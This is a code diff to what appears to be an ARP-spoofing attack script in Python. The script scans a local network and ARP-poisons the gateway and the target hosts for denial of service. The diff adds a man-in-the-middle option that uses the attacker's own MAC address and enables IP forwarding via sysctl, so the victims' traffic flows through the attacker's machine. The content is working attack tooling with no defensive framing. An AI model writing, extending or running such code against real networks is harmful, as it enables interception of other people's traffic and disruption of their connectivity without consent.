@@ -29,6 +29,24 @@ def randomMac():
 
     return generated[1:]
 
+def enableForwarding():
+    print("Enabling IP forwarding for MITM...")
+    result = os.system("sysctl -w net.ipv4.ip_forward=1")
+    if result ==0:
+        print("Done")
+    else:
+        print("An error ocurred enabling IP forwarding")
+        sys.exit(0)
+
+def disableForwarding():
+    print("Disabling IP forwarding...")
+    result = os.system("sysctl -w net.ipv4.ip_forward=0")
+    if result ==0:
+        print("Done")
+    else:
+        print("An error ocurred disabling IP forwarding")
+        sys.exit(0)
+
 # Returns a list with all IPs on the network
 def scan(network, interface):
     try:
@@ -107,6 +125,7 @@ parser.add_argument("-i", "--interface", help="Interface to use")
 parser.add_argument("-n", "--network", help="Network to DoS")
 parser.add_argument("-g", "--gateway", help="Gateway IP")
 parser.add_argument("-f", "--file", help="List of IPs to exclude from the attack (one per line)")
+parser.add_argument("-m", "--mitm", action="store_true", help="Use MITM instead")
 args = parser.parse_args()
 
 # Check OS
@@ -141,8 +160,17 @@ network = args.network
 gateway = args.gateway
 
 try:
-    MAC = randomMac() 
+    # Get my own MAC for MITM, or use random one for DoS
+    if args.mitm:
+        MAC = get_if_hwaddr(interface)
+        enableForwarding()
+    else:
+        MAC = randomMac()
     target_ips = scan(network, interface)
     arp_poison(gateway, target_ips)
 except KeyboardInterrupt:
     print("User interrupt. Exiting...")
+
+if args.mitm:
+    disableForwarding()
+
